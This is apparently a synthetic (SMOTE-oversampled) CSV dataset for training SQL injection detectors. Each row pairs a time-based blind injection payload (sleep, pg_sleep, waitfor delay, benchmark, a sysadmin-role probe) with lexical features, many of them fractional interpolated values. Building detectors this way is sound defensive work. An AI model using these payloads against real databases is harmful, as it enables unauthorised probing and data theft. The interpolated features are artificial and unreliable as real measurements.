id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000031,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000072,0.3635084932385585,26.0,18.14135408962054,4.0419643185468,12.000000000000002,4.0,3.0,7.0,0.46153846153846156,0.15384615384615385,0.11538461538461536,0.2692307692307692,2.85864591037946,0.14135408962054014,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.1413540896205402,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000032,attack,time,1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',nearest_attack_euclidean,R000124,1.140897866681607,122.3711529426466,29.32576941147068,3.4706419871197656,42.977308234412035,10.0,54.04538353117593,15.348461177058642,0.3515585387283773,0.08174901535467159,0.4413691375086477,0.12532330840830347,1.674230588529321,0.0,0.0,0.0,1.0,1.0,0.0,9.674230588529321,0.0,0.0,-5.551115123125783e-17,3.674230588529321,1.0,0.0,0.0,0.32576941147067895,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,3.0,0.0,1.0,1.0,0.0,0.674230588529321,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.674230588529321
SMOTE_000033,attack,time,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000303,0.0764804891829027,101.42191587908549,29.960132129592104,3.881955367555691,25.86046245357236,28.84052851836841,35.78072671275656,10.940198194388154,0.25500904611981706,0.28438065382488564,0.3527323600663567,0.10787793998894055,0.9800660647960512,0.0,2.0,0.0,0.0,1.980066064796051,0.0,4.980066064796051,0.0,0.0,1.0,3.980066064796051,0.9800660647960513,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.9800660647960513,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.980066064796051
SMOTE_000034,attack,time,waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,nearest_attack_euclidean,R000162,1.1362686994691358,54.58454607943968,21.584546079439683,3.7842809978406495,25.33818431775874,3.0,16.83090784112063,9.415453920560315,0.4639115802464172,0.05496510497026294,0.30853440875104365,0.17258890603227617,5.0,0.0,0.0,0.0,0.0,0.41545392056031566,0.0,2.0,0.0,0.0,-5.551115123125783e-17,0.4154539205603156,1.0,0.0,0.0,0.0,0.0,0.41545392056031566,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000054,0.6033099996542529,98.82844651455417,29.0,3.7174560745140472,26.371334885915633,18.0,39.45711162863854,15.0,0.265989626508083,0.18245417220637708,0.39951105778022566,0.15204514350531423,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.15237054287951468,0.8476294571204854,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.1523705428795148,0.0,1.0,0.1523705428795147,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8476294571204854,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.152370542879515
SMOTE_000036,attack,time,"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000078,0.2990752657938998,53.0,20.0,3.2458662088719787,9.999999999999998,10.0,24.0,9.0,0.18867924528301888,0.18867924528301888,0.4528301886792453,0.16981132075471697,0.0912852978718186,0.9087147021281814,0.0,0.0,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.9999999999999999,0.0912852978718186,0.9087147021281815,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000287,0.3455111584326763,90.08563355502793,26.167323872865122,3.426961264411756,21.0,18.0,39.50197161859536,11.583661936432561,0.23345857656219224,0.2001073513390219,0.43787031148014455,0.1285637606186413,0.0,1.0,2.0,0.0,0.0,2.0,0.0,5.583661936432561,0.0,0.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,time,"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000291,0.6069431945262829,85.0,28.0,3.590369745717318,21.83372735860584,18.0,36.0,9.166272641394158,0.2568673806894805,0.21176470588235294,0.4235294117647059,0.10783850166346069,0.0,0.16627264139415876,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,2.0,0.0,0.16627264139415876,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.8337273586058414,0.1662726413941588,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000039,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,0.9364496778525837,91.46104382675672,29.0,3.839523407111324,33.478595839019015,11.914383356076065,32.110872953623605,13.957191678038033,0.37011199580185344,0.12795295661753134,0.34927037080693923,0.15266467677367598,4.0,0.0,0.0,0.0,0.0,1.239297919509508,0.0,4.478595839019016,0.0,0.23929791950950807,-5.551115123125783e-17,5.239297919509507,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,1.2392979195095082,0.0,1.0,1.0,0.23929791950950804,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7607020804904919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.239297919509508
SMOTE_000040,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'bemh'  =  'bemh",nearest_attack_euclidean,R000292,1.1328081794368443,111.7947564402368,25.6986891100592,3.391664442853509,23.5895128804736,24.410487119526405,50.0,13.7947564402368,0.21051808784991147,0.21895757106610977,0.44737047803752217,0.12315386304645663,2.7947564402367986,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,2.0,0.6986891100591996,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R000213,1.2908754900866881,136.70278773415,31.39065566053182,3.680806413777668,52.21868867893636,10.0,55.65606603680909,18.828033018404547,0.38230154685325024,0.07326634602610475,0.40691454569609287,0.13751756142455215,3.6093443394681817,0.0,0.0,0.0,1.0,1.0,0.0,9.60934433946818,0.0,0.0,-5.551115123125783e-17,5.218688678936363,1.0,0.0,0.0,0.39065566053181844,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,3.0,0.0,1.0,2.0,0.39065566053181844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.390655660531818
SMOTE_000042,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000155,0.5215037904164397,119.67786791071833,29.853096434524257,3.8717926119705486,40.971675041669805,18.0,43.706192869048515,17.0,0.3420234819799201,0.15051640920949455,0.3653057223349516,0.14215438647563375,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,1.0,1.853096434524258,0.14690356547574202,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.853096434524257
SMOTE_000043,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,1.1486437142088486,85.7176115711173,28.282388428882705,3.6927627229328257,32.0,10.0,34.0,9.717611571117297,0.3733291969527013,0.11666537404771915,0.3966622717622451,0.1133431572373344,1.0,0.0,1.4352231422345938,0.0,0.0,1.0,0.0,5.0,0.0,1.0,-5.551115123125783e-17,2.4352231422345936,1.0,0.0,0.7176115711172969,0.2823884288827031,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,time,1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',nearest_attack_euclidean,R000113,0.5258068907349724,138.67556986829405,30.225189956098017,3.629820101113586,50.67556986829405,10.0,58.0,20.0,0.3653741467987397,0.07211657422741595,0.41827613051901247,0.1442331484548319,4.0,0.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,0.0,-5.551115123125783e-17,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,3.0,0.0,1.0,2.0,0.0,0.774810043901982,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.774810043901982
SMOTE_000045,attack,time,"1"" where 7371  =  7371 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000263,1.0098582043802034,45.60122483217559,22.601224832175596,4.139255863346015,17.0,12.0,9.0,7.601224832175595,0.37284018253768836,0.26318130532072115,0.1973859789905409,0.16659253315104958,2.0,0.6012248321755953,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.6012248321755953,1.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000125,0.3637676834643923,99.22258874962962,28.445177499259245,3.772852139022207,26.89035499851849,22.0,37.554822500740755,12.777411250370378,0.2709452360972687,0.2217275805563786,0.37853222778660695,0.1287949555597457,4.0,0.0,0.0,0.0,0.0,1.777411250370378,0.0,6.0,0.0,0.0,1.0,1.7774112503703778,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,time,1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000147,1.5529650644845032,89.68207985631201,22.75697388180696,3.1825779648254504,35.06534253997531,1.5513947763613931,41.96255298725253,11.102789552722784,0.3895131246422144,0.016853937392664317,0.4692051461473896,0.1244277918177317,0.5513947763613922,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,8.551394776361391,0.0,0.0,-5.551115123125783e-17,0.9999999999999999,0.551394776361392,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,1.0,0.0,0.5513947763613921,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.551394776361392
SMOTE_000048,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,1.1808687001358902,92.23111591947739,29.30129649664489,3.8423397284645033,33.0,12.41037197315913,32.615557959738695,14.205185986579565,0.36247956553235255,0.13195579692647083,0.35171290500949215,0.15385173253168452,4.0,0.0,0.0,0.0,0.0,1.3012964966448912,0.0,4.602592993289782,0.0,0.0,0.3012964966448912,5.301296496644891,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,1.0,1.0,0.0,0.30129649664489117,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.301296496644891
SMOTE_000049,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R000307,0.26729898334827756,21.652353931182255,16.326176965591127,3.9333734503396607,12.000000000000002,3.3261769655911273,2.3261769655911273,4.0,0.555221020343298,0.1529868622854387,0.10671844392349722,0.185073673447766,2.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.7450311944348995,56.64175015150923,20.72637497474846,3.1561277135090724,13.0,10.0,25.641750151509232,8.0,0.23000216036673024,0.17692473874363865,0.4515333098947202,0.14153979099491093,0.0,0.7263749747484612,0.0,0.0,0.0,1.1102230246251565e-16,0.0,5.273625025251539,0.0,0.0,1.0,0.0,0.0,0.7263749747484614,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.16017281960545018,33.24600065820831,15.892285808315473,3.1841387681576996,10.999999999999998,0.8922858083154726,13.46142904157736,7.892285808315471,0.33256426226547786,0.026243700244572704,0.40331653398552714,0.23787550350442224,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.8922858083154717,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000052,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.6080033982575712,30.700497843545975,15.620298706127585,3.4200413549138604,12.080199137418388,0.0,9.08019913741839,9.540099568709195,0.39344166619990173,0.0,0.2950666591984276,0.3114916746016707,0.0,0.540099568709195,2.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.540099568709195,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.540099568709195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.540099568709195
SMOTE_000053,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000155,0.011899575907101667,120.95032956178963,29.99503295617896,3.887381717164126,41.9602636494317,18.0,43.99006591235792,17.0,0.3469047770073763,0.14882689806327054,0.3637095878695976,0.14055873705975552,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,1.0,1.9950329561789628,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.995032956178962
SMOTE_000054,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000193,0.046110184098455444,56.0584187129798,21.980527095673402,3.5281496533662198,18.058418712979794,10.0,22.0,6.0,0.32210045735267323,0.17839461648613864,0.392468156269505,0.10703676989168318,0.0,0.0,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,-5.551115123125783e-17,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.9805270956734012,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.980527095673401
SMOTE_000055,attack,time,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000175,0.04694770776368248,102.42490022337479,29.060700031910685,3.85915054935846,27.0,29.0,36.36420019146411,10.060700031910685,0.26367401456816697,0.28320542305469787,0.3549066389177772,0.09821392345935796,1.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0607000319106845,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,0.9323313814690287,91.43262960007158,29.0,3.8396083175249727,33.476491081486785,11.905964325947135,32.09719202966409,13.952982162973568,0.3701916980172284,0.12790763358243598,0.3492347756427912,0.1526658927575444,4.0,0.0,0.0,0.0,0.0,1.2382455407433919,0.0,4.476491081486784,0.0,0.23824554074339183,-5.551115123125783e-17,5.238245540743391,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,1.2382455407433919,0.0,1.0,1.0,0.2382455407433918,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7617544592566082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.238245540743391
SMOTE_000057,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000075,0.08920518144749937,119.13192972027777,29.934035139861116,3.531398891855975,45.0,10.0,50.0,14.131929720277762,0.37773895149576364,0.08394198922128082,0.41970994610640405,0.11860911317655151,1.1319297202777627,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000058,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,2.013443038684262,56.96772810364706,25.202445255675457,4.158777853710499,27.562837592296148,3.1012226278377284,13.303667883513185,13.0,0.46640860335393347,0.05338490297353754,0.23546101121518115,0.24474548245734784,3.1012226278377284,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,2.348166058243408,1.0,2.550611313918864,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000059,attack,time,"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000248,1.0733812697094427,104.28842967279071,29.38140494546512,3.8332402566637382,26.0,29.61859505453488,38.28842967279071,10.38140494546512,0.24950080142587522,0.2843540128339539,0.366651811765086,0.09949337397508487,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.381404945465119,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.6185950545348804,0.3814049454651196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,time,begin user_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000191,0.25681090742623286,30.711321526178686,18.133964578536066,3.7150567476831893,17.711321526178686,1.0,8.0,4.0,0.5766098707960462,0.03256847147722722,0.26054777181781774,0.13027388590890887,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
